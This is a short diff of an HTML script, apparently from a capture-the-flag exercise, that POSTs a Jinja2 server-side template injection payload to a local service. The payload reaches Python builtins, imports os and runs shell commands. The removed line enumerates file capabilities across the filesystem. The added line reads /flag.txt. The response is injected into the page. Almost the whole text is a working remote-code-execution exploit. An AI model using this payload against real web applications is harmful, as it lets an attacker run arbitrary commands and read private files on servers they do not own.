@@ -4,7 +4,7 @@
   fetch("http://127.0.0.1:4000/", {
     method: "POST",
     headers: {"Content-Type":"application/x-www-form-urlencoded"},
-    body: `comment={{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo $(getcap -r / 2>/dev/null)').read() }}`
+    body: `comment={{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo $(python3 -c "print(open("/flag.txt").read())")').read() }}`
   }).then(r => r.text())
     .then(t => document.body.innerHTML = t);
 </script>
